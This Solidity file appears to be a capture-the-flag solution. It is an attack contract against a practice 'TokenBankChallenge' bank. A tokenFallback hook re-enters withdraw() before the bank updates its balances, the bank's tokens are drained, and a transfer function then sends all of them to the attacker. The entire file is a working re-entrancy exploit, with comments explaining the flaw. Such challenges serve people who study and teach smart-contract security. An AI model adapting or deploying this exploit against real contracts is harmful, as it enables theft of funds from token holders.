pragma solidity ^0.4.21;

import "./TokenBankChallenge.sol";

contract AttackTokenBankChallenge{
    
    TokenBankChallenge tokenBankChallenge;

    function AttackTokenBankChallenge(address tokenBankContractAddress) public{
        tokenBankChallenge = TokenBankChallenge(tokenBankContractAddress);
    }

    /*  Require to have some balance in the tokenBankChallenge to call withdraw.
    */
    function deposit() public{
        tokenBankChallenge.token().transfer(address(tokenBankChallenge), 500000 * 10**18);
    }

    /*  Implementing a tokenFallback function since the SET tokens have a 
        fallback function of their own.
    */
    function tokenFallback(
        address from,
        uint256,
        bytes
    ) public {
        require(msg.sender == address(tokenBankChallenge.token()));
        if (from != address(tokenBankChallenge)) return;
        attack();
    }

    /*  This exposes the re-entrancy vulnerability since the amount of tokens 
        isn't updated withdraw can continously be called until there are no
        tokens left to withdraw.
    */
    function attack() public{
        uint256 myBalance = tokenBankChallenge.balanceOf(address(this));
        uint256 tokenBankBalance = tokenBankChallenge.token().balanceOf(address(tokenBankChallenge));
        if (tokenBankBalance == 0) return;
        else if(myBalance < tokenBankBalance){
            tokenBankChallenge.withdraw(myBalance);
        }
        else{
            tokenBankChallenge.withdraw(tokenBankBalance);
        }
    }

    /*  After the attack contract has all the tokens, this will transfer all
        of it to the attacker.
    */
    function transfer() public{
        uint256 contractBalance = tokenBankChallenge.token().balanceOf(address(this));
        require(contractBalance > 0);
        tokenBankChallenge.token().transfer(msg.sender, contractBalance);
    }


}